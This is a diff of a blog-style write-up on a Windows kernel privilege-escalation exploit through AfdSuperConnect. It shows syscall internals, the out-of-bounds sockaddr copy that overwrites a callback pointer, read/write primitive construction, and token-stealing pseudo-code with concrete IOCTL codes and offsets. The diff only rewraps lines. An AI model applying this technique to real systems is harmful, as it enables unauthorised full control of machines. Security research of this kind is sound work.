@@ -40,8 +40,9 @@ What drivers are loaded on system startup is determined by the registry and the 
 &lt;/code>&lt;/pre>&lt;p>&lt;code>ntdll!NtCreateFile&lt;/code> is the function that actually transitions into the kernel address space.
 The assembly for all &lt;code>ntdll!NtXxx&lt;/code> functions looks something like the following:&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-asm" data-lang="asm">NtCreateFile:
-&lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">r10&lt;/span>, &lt;span style="color:#66d9ef">rcx&lt;/span> &lt;span style="color:#75715e">; load the first argument into r10, this is because the syscall instruction uses rcx as the return location
-&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">mov&lt;/span> &lt;span style="color:#66d9ef">eax&lt;/span>, &lt;span style="color:#ae81ff">0x55&lt;/span> &lt;span style="color:#75715e">; load the syscall value into eax (0x55 is &amp;#39;NtCreateFile&amp;#39; on the version of Windows this was taken from)
+&lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">r10&lt;/span>, &lt;span style="color:#66d9ef">rcx&lt;/span> &lt;span style="color:#75715e">; load the first argument into r10, as the syscall
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">; instruction uses rcx as the return location
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">mov&lt;/span> &lt;span style="color:#66d9ef">eax&lt;/span>, &lt;span style="color:#ae81ff">0x55&lt;/span> &lt;span style="color:#75715e">; load the syscall value into eax (0x55 is &amp;#39;NtCreateFile&amp;#39;)
 &lt;/span>&lt;span style="color:#75715e">&lt;/span>
 &lt;span style="color:#66d9ef">test&lt;/span> &lt;span style="color:#66d9ef">byte&lt;/span> &lt;span style="color:#66d9ef">ptr&lt;/span> [.&lt;span style="color:#66d9ef">Running32Bit&lt;/span>], &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#75715e">; check if we are running a 32bit executable
 &lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">jnz&lt;/span> &lt;span style="color:#66d9ef">.Syscallx86&lt;/span>
@@ -49,7 +50,7 @@ The assembly for all &lt;code>ntdll!NtXxx&lt;/code> functions looks something li
 &lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">systcall&lt;/span>
 &lt;span style="color:#a6e22e">ret&lt;/span>
 .Syscallx86:
-&lt;span style="color:#75715e">; x86 does not have a syscall instruction, use the slower int 0x2e instead of syscall.
+&lt;span style="color:#75715e">; x86 does not have a syscall instruction, use int 0x2e instead of syscall.
 &lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">int&lt;/span> &lt;span style="color:#ae81ff">0x2e&lt;/span>
 &lt;span style="color:#a6e22e">ret&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>We will only focus on the x64 case here. The syscall instruction loads the new instruction pointer from a
@@ -61,9 +62,9 @@ Here it is important to know that the address space does not change, but at non-
 faults when it is accessing a page which does not have the &lt;code>USER&lt;/code> bit set in the page table.&lt;/p>
 &lt;p>In Windows 10 the &lt;code>IA32_LSTAR&lt;/code> MSR points to the function &lt;code>nt!KiSystemCall64&lt;/code>, which first establishes a stack pointer:&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-asm" data-lang="asm">KiSystemCall64:
-&lt;span style="color:#a6e22e">swapgs&lt;/span> &lt;span style="color:#75715e">; load the saved kernel thread locals from some MSR
-&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">mov&lt;/span> &lt;span style="color:#66d9ef">gs&lt;/span>:[&lt;span style="color:#66d9ef">gs.user_stack&lt;/span>], &lt;span style="color:#66d9ef">rsp&lt;/span> &lt;span style="color:#75715e">; save the user space stack, in the kernel thread locals
-&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">mov&lt;/span> &lt;span style="color:#66d9ef">rsp&lt;/span>, &lt;span style="color:#66d9ef">gs&lt;/span>:[&lt;span style="color:#66d9ef">gs.kernel_stack&lt;/span>] &lt;span style="color:#75715e">; load the kernel space stack, from the kernel thread locals
+&lt;span style="color:#a6e22e">swapgs&lt;/span> &lt;span style="color:#75715e">; load saved kernel thread locals from some MSR
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">mov&lt;/span> &lt;span style="color:#66d9ef">gs&lt;/span>:[&lt;span style="color:#66d9ef">gs.user_stack&lt;/span>], &lt;span style="color:#66d9ef">rsp&lt;/span> &lt;span style="color:#75715e">; save user stack, in the kernel thread locals
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">mov&lt;/span> &lt;span style="color:#66d9ef">rsp&lt;/span>, &lt;span style="color:#66d9ef">gs&lt;/span>:[&lt;span style="color:#66d9ef">gs.kernel_stack&lt;/span>] &lt;span style="color:#75715e">; load kernel space stack, from the thread locals
 &lt;/span>&lt;span style="color:#75715e">&lt;/span>
 &lt;span style="color:#75715e">; ... from here we are just in kernel space, and can do whatever we want
 &lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">; e.g. Save all the registers and then call the according NtXxx
@@ -159,7 +160,8 @@ SockaddrFamily &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:
 sockaddr_size &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">&amp;amp;::&lt;/span>sockaddr_size)[SockaddrFamily];
 }
 &lt;span style="color:#75715e">/* this is where the magic happens */&lt;/span>
-memcpy(&lt;span style="color:#f92672">&amp;amp;&lt;/span>_Dst&lt;span style="color:#f92672">-&amp;gt;&lt;/span>contains_the_function_pointer&lt;span style="color:#f92672">-&amp;gt;&lt;/span>sockaddr,TlConnect&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ConnectSockaddr,(ulonglong)sockaddr_size);
+memcpy(&lt;span style="color:#f92672">&amp;amp;&lt;/span>_Dst&lt;span style="color:#f92672">-&amp;gt;&lt;/span>contains_the_function_pointer&lt;span style="color:#f92672">-&amp;gt;&lt;/span>sockaddr,
+TlConnect&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ConnectSockaddr, sockaddr_size);
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Crucially, as this is all happening in &amp;ldquo;tcpip.sys&amp;rdquo;, the code only expects a &lt;code>sockaddr&lt;/code> of type &lt;code>AF_INET&lt;/code> or &lt;code>AF_INET6&lt;/code> which are of size &lt;code>0x1c&lt;/code> and &lt;code>0x24&lt;/code>, respectively.
 Hence, tcpip only reserves &lt;code>0x24&lt;/code> bytes of memory for said &lt;code>sockaddr&lt;/code> and we can overwrite &lt;code>0x6e - 0x24&lt;/code> bytes after the size reserved for the &lt;code>sockaddr&lt;/code>.
 Fortunately for us, this range of bytes contains a callback function pointer (originally pointing to &lt;code>afd!AfdTLBufferedSendComplete&lt;/code>) and its callback context argument.&lt;/p>
@@ -208,7 +210,8 @@ HANDLE read_pipe;
 HANDLE write_pipe;
 CreatePipe (&lt;span style="color:#f92672">&amp;amp;&lt;/span>read_pipe, &lt;span style="color:#f92672">&amp;amp;&lt;/span>write_pipe, NULL, NULL);
 &lt;span style="color:#75715e">// ends up in &amp;#39;NpSetAttribute&amp;#39;
-&lt;/span>&lt;span style="color:#75715e">&lt;/span>NtFsControlFile(write_pipe, NULL, NULL, NULL, &lt;span style="color:#f92672">&amp;amp;&lt;/span>status, &lt;span style="color:#ae81ff">0x11003C&lt;/span>, rwx_memory, &lt;span style="color:#66d9ef">sizeof&lt;/span>(rwx_memory), output, &lt;span style="color:#66d9ef">sizeof&lt;/span>(output));
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>NtFsControlFile(write_pipe, NULL, NULL, NULL, &lt;span style="color:#f92672">&amp;amp;&lt;/span>status, &lt;span style="color:#ae81ff">0x11003C&lt;/span>,
+rwx_memory, &lt;span style="color:#66d9ef">sizeof&lt;/span>(rwx_memory), output, &lt;span style="color:#66d9ef">sizeof&lt;/span>(output));
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>But as far as I know, there is no way for us to know where this allocation will end up (without another exploit or administrator privileges which would defeat the purpose).
 Even if we could control the heap perfectly we do not know where the heap starts.
 This is because of ASLR (Address Space Layout Randomization). At system startup, Windows randomizes all addresses it will use during runtime.&lt;/p>
@@ -285,10 +288,12 @@ These pointers then get dereferenced and either written to the controlled &lt;co
 &lt;p>If one cannot find primitives as perfect as these, one can search for functions that &lt;em>spread&lt;/em> the first argument.
 The perfect spread function would be something like:&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">spread_function&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> arguments &lt;span style="color:#f92672">*&lt;/span>arguments){
-(&lt;span style="color:#f92672">*&lt;/span>arguments&lt;span style="color:#f92672">-&amp;gt;&lt;/span>function)(arguments&lt;span style="color:#f92672">-&amp;gt;&lt;/span>argument_1, arguments&lt;span style="color:#f92672">-&amp;gt;&lt;/span>argument_2, arguments&lt;span style="color:#f92672">-&amp;gt;&lt;/span>argument_3, arguments&lt;span style="color:#f92672">-&amp;gt;&lt;/span>argument_4);
+(&lt;span style="color:#f92672">*&lt;/span>arguments&lt;span style="color:#f92672">-&amp;gt;&lt;/span>function)(arguments&lt;span style="color:#f92672">-&amp;gt;&lt;/span>argument_1, arguments&lt;span style="color:#f92672">-&amp;gt;&lt;/span>argument_2,
+arguments&lt;span style="color:#f92672">-&amp;gt;&lt;/span>argument_3, arguments&lt;span style="color:#f92672">-&amp;gt;&lt;/span>argument_4);
 }
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Using the perfect spread function one could obtain a read/write function as follows:&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">read_write_function_called_by_spread_function&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> argument_1 &lt;span style="color:#f92672">*&lt;/span>arg_1, &lt;span style="color:#66d9ef">struct&lt;/span> argument_2 &lt;span style="color:#f92672">*&lt;/span>arg_2){
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">read_write_function_called_by_spread_function&lt;/span>(
+&lt;span style="color:#66d9ef">struct&lt;/span> argument_1 &lt;span style="color:#f92672">*&lt;/span>arg_1, &lt;span style="color:#66d9ef">struct&lt;/span> argument_2 &lt;span style="color:#f92672">*&lt;/span>arg_2){
 arg_1&lt;span style="color:#f92672">-&amp;gt;&lt;/span>value &lt;span style="color:#f92672">=&lt;/span> arg_2&lt;span style="color:#f92672">-&amp;gt;&lt;/span>value;
 }
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>In practice, we used two spread functions and then different read and write functions.&lt;/p>
@@ -324,14 +329,19 @@ This then gives us the offset of the &lt;code>Token&lt;/code> field.&lt;/p>
 &lt;p>Putting it all together in pseudo-code, it looks something like this:&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">// Use the Windows API to get all the information we want.
 &lt;/span>&lt;span style="color:#75715e">&lt;/span>token, process :&lt;span style="color:#f92672">=&lt;/span> find_token_and_process_using_NtQuerySystemInformation();
-PsInitialSystemProcess_export, read_function, write_function :&lt;span style="color:#f92672">=&lt;/span> find_exported_symbols_using_NtQuerySystemInformation();
-&lt;span style="color:#75715e">// Use a system call that is more or less equivalent to `socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)`
+PsInitialSystemProcess_export, read_function, write_function :&lt;span style="color:#f92672">=&lt;/span>
+find_exported_symbols_using_NtQuerySystemInformation();
+&lt;span style="color:#75715e">// Use a system call that is more or less equivalent to
+&lt;/span>&lt;span style="color:#75715e">// `socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)`
 &lt;/span>&lt;span style="color:#75715e">&lt;/span>socket_handle :&lt;span style="color:#f92672">=&lt;/span> NtCreateFile(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Device&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Afd&amp;#34;&lt;/span>, EaBuffer &lt;span style="color:#f92672">=&lt;/span> {AF_INET, SOCK_STREAM, IPPROTO_TCP});
-&lt;span style="color:#75715e">// use the system call that is equivalent to `setsockopt(socket, IPPROTO_TCP, TCP_FASTOPEN, &amp;amp;(u32){1}, 1)`
+&lt;span style="color:#75715e">// use the system call that is equivalent to
+&lt;/span>&lt;span style="color:#75715e">// `setsockopt(socket, IPPROTO_TCP, TCP_FASTOPEN, &amp;amp;(u32){1}, 1)`
 &lt;/span>&lt;span style="color:#75715e">&lt;/span>NtDeviceIoControlFile(socket_handle, &lt;span style="color:#ae81ff">0x120bf&lt;/span>, .input_buffer &lt;span style="color:#f92672">=&lt;/span> {SetSockOpt, .level &lt;span style="color:#f92672">=&lt;/span> IPPROTO_TCP, .option &lt;span style="color:#f92672">=&lt;/span> TCP_FASTOPEN, .optval &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>(u32){&lt;span style="color:#ae81ff">1&lt;/span>}, .optlen &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>});
-&lt;span style="color:#75715e">// use the system call that is equivalent to `bind(socket, &amp;amp;(struct sockaddr){AF_INET}, sizeof(struct sockaddr))`
+&lt;span style="color:#75715e">// use the system call that is equivalent to
+&lt;/span>&lt;span style="color:#75715e">// `bind(socket, &amp;amp;(struct sockaddr){AF_INET}, sizeof(struct sockaddr))`
 &lt;/span>&lt;span style="color:#75715e">&lt;/span>NtDeviceIoControlFile(socket_handle, &lt;span style="color:#ae81ff">0x12003&lt;/span>, ...);
-&lt;span style="color:#75715e">// The read and write primitives now work by triggering the vulnerability by calling `AfdSuperConnect` through the `NtDeviceIoControlFile`.
+&lt;span style="color:#75715e">// The read and write primitives now work by triggering the vulnerability by calling
+&lt;/span>&lt;span style="color:#75715e">// `AfdSuperConnect` through the `NtDeviceIoControlFile`.
 &lt;/span>&lt;span style="color:#75715e">&lt;/span>function u64 &lt;span style="color:#a6e22e">read_u64&lt;/span>(u64 address)&lt;span style="color:#f92672">:&lt;/span>
 read_argument :&lt;span style="color:#f92672">=&lt;/span> {.pointer &lt;span style="color:#f92672">=&lt;/span> address};
 NtDeviceIoControlFile(socket_handle, &lt;span style="color:#ae81ff">0x120c7&lt;/span>, .input_buffer &lt;span style="color:#f92672">=&lt;/span> {.sockaddr &lt;span style="color:#f92672">=&lt;/span> {AF_INET, .offset_0x5c &lt;span style="color:#f92672">=&lt;/span> read_function, .offset_0x64 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>read_argument}});
